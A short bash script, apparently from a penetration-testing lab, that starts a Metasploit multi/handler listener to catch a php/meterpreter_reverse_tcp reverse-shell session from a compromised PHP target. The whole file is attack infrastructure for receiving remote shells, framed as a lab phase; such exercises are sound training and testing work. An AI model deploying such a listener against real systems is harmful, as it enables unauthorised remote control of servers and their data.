#!/usr/bin/env bash
# Phase 3 handler: catch the php/meterpreter_reverse_tcp session.
set -euo pipefail
cd "$(dirname "$0")/.."
source lab.env
exec msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter_reverse_tcp; set LHOST $LHOST; set ReverseListenerBindAddress 0.0.0.0; set LPORT $LPORT_PHP; run"
